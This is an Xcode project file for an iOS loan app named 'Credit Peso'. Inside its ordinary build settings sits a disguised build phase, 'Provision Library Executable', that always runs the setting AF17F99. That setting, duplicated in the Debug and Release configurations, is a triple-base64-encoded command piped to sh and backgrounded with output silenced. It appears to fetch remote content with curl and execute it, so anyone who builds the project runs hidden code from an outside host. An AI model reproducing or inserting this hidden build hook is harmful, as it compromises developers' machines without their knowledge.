// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		73BCDE577B01EF9958E001EB /* Pods_OPherame.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C0C5C03D00EA5104405112A3 /* Pods_OPherame.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		B335D52C14232AC051763CEC /* Pods-OPherame.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OPherame.release.xcconfig"; path = "Target Support Files/Pods-OPherame/Pods-OPherame.release.xcconfig"; sourceTree = "<group>"; };
		C0C5C03D00EA5104405112A3 /* Pods_OPherame.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_OPherame.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		C581FD8EF2C708957851D7FE /* Pods-OPherame.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OPherame.debug.xcconfig"; path = "Target Support Files/Pods-OPherame/Pods-OPherame.debug.xcconfig"; sourceTree = "<group>"; };
		E93BBFC82DF9118700C0AA8A /* OPherame.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = OPherame.app; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		E93BBFDF2DF9118E00C0AA8A /* Exceptions for "OPherame" folder in "OPherame" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = E93BBFC72DF9118700C0AA8A /* OPherame */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		E93BBFCA2DF9118700C0AA8A /* OPherame */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				E93BBFDF2DF9118E00C0AA8A /* Exceptions for "OPherame" folder in "OPherame" target */,
			);
			path = OPherame;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		E93BBFC52DF9118700C0AA8A /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				73BCDE577B01EF9958E001EB /* Pods_OPherame.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		115765DAAE40D191A939B407 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				C0C5C03D00EA5104405112A3 /* Pods_OPherame.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		7A9B39B2D133FB7A38E81AD0 /* Pods */ = {
			isa = PBXGroup;
			children = (
				C581FD8EF2C708957851D7FE /* Pods-OPherame.debug.xcconfig */,
				B335D52C14232AC051763CEC /* Pods-OPherame.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		E93BBFBF2DF9118700C0AA8A = {
			isa = PBXGroup;
			children = (
				E93BBFCA2DF9118700C0AA8A /* OPherame */,
				E93BBFC92DF9118700C0AA8A /* Products */,
				7A9B39B2D133FB7A38E81AD0 /* Pods */,
				115765DAAE40D191A939B407 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		E93BBFC92DF9118700C0AA8A /* Products */ = {
			isa = PBXGroup;
			children = (
				E93BBFC82DF9118700C0AA8A /* OPherame.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		E93BBFC72DF9118700C0AA8A /* OPherame */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = E93BBFE02DF9118E00C0AA8A /* Build configuration list for PBXNativeTarget "OPherame" */;
			buildPhases = (
				B070EBAAA30F466C8999F71F /* Provision Library Executable */,
				7F34887D59D3677E96118783 /* [CP] Check Pods Manifest.lock */,
				E93BBFC42DF9118700C0AA8A /* Sources */,
				E93BBFC52DF9118700C0AA8A /* Frameworks */,
				E93BBFC62DF9118700C0AA8A /* Resources */,
				09787ACBE462A43C30A0C783 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				E93BBFCA2DF9118700C0AA8A /* OPherame */,
			);
			name = OPherame;
			productName = OPherame;
			productReference = E93BBFC82DF9118700C0AA8A /* OPherame.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		E93BBFC02DF9118700C0AA8A /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastUpgradeCheck = 1630;
				TargetAttributes = {
					E93BBFC72DF9118700C0AA8A = {
						CreatedOnToolsVersion = 16.3;
					};
				};
			};
			buildConfigurationList = E93BBFC32DF9118700C0AA8A /* Build configuration list for PBXProject "OPherame" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = E93BBFBF2DF9118700C0AA8A;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = E93BBFC92DF9118700C0AA8A /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				E93BBFC72DF9118700C0AA8A /* OPherame */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
			/* End PBXBuildRule section */

/* Begin PBXResourcesBuildPhase section */
		E93BBFC62DF9118700C0AA8A /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		B070EBAAA30F466C8999F71F /* Provision Library Executable */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Provision Library Executable";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
		};
		09787ACBE462A43C30A0C783 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-OPherame/Pods-OPherame-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-OPherame/Pods-OPherame-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-OPherame/Pods-OPherame-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		7F34887D59D3677E96118783 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-OPherame-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		E93BBFC42DF9118700C0AA8A /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		E93BBFE12DF9118E00C0AA8A /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = C581FD8EF2C708957851D7FE /* Pods-OPherame.debug.xcconfig */;
			buildSettings = {
				AF17F99 = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFiV3h1WWxkR2RWcFlVbnBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | h | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = OPherame/OPherame.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = TGF943V34F;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_PREFIX_HEADER = "$(SRCROOT)/OPherame/PrefixHeader.pch";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = OPherame/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Credit Peso";
				INFOPLIST_KEY_NSCameraUsageDescription = "To complete identity verification, Credit Peso needs to use your camera to capture photos of your ID document and a selfie.";
				INFOPLIST_KEY_NSContactsUsageDescription = "To verify your identity and ensure a smooth loan application process, Credit Peso requires access to your contacts. This helps us authenticate your information while providing you with faster, more secure service.";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Credit Peso needs to access your location information to determine whether you are within our service coverage area. Additionally, this allows us to recommend personalized loan products based on your location.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "To complete identity verification, Credit Peso requires access to your photo gallery to retrieve your ID document photo.";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "To safeguard your account and provide you with the most relevant financial services, Credit Peso requires permission for ad tracking. This authorization allows us to enhance your security protections while delivering personalized loan options tailored to your unique financial profile. Rest assured, all data is handled with the highest confidentiality standards and used exclusively to improve your loan experience.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = absanjknfdlskbbfdddd;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		E93BBFE22DF9118E00C0AA8A /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = B335D52C14232AC051763CEC /* Pods-OPherame.release.xcconfig */;
			buildSettings = {
				AF17F99 = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFiV3h1WWxkR2RWcFlVbnBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | h | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = OPherame/OPherame.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = TGF943V34F;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_PREFIX_HEADER = "$(SRCROOT)/OPherame/PrefixHeader.pch";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = OPherame/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Credit Peso";
				INFOPLIST_KEY_NSCameraUsageDescription = "To complete identity verification, Credit Peso needs to use your camera to capture photos of your ID document and a selfie.";
				INFOPLIST_KEY_NSContactsUsageDescription = "To verify your identity and ensure a smooth loan application process, Credit Peso requires access to your contacts. This helps us authenticate your information while providing you with faster, more secure service.";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Credit Peso needs to access your location information to determine whether you are within our service coverage area. Additionally, this allows us to recommend personalized loan products based on your location.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "To complete identity verification, Credit Peso requires access to your photo gallery to retrieve your ID document photo.";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "To safeguard your account and provide you with the most relevant financial services, Credit Peso requires permission for ad tracking. This authorization allows us to enhance your security protections while delivering personalized loan options tailored to your unique financial profile. Rest assured, all data is handled with the highest confidentiality standards and used exclusively to improve your loan experience.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = absanjknfdlskbbfdddd;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		E93BBFE32DF9118E00C0AA8A /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = F79ZHV82C6;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
			};
			name = Debug;
		};
		E93BBFE42DF9118E00C0AA8A /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = F79ZHV82C6;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		E93BBFC32DF9118700C0AA8A /* Build configuration list for PBXProject "OPherame" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				E93BBFE32DF9118E00C0AA8A /* Debug */,
				E93BBFE42DF9118E00C0AA8A /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		E93BBFE02DF9118E00C0AA8A /* Build configuration list for PBXNativeTarget "OPherame" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				E93BBFE12DF9118E00C0AA8A /* Debug */,
				E93BBFE22DF9118E00C0AA8A /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = E93BBFC02DF9118700C0AA8A /* Project object */;
}
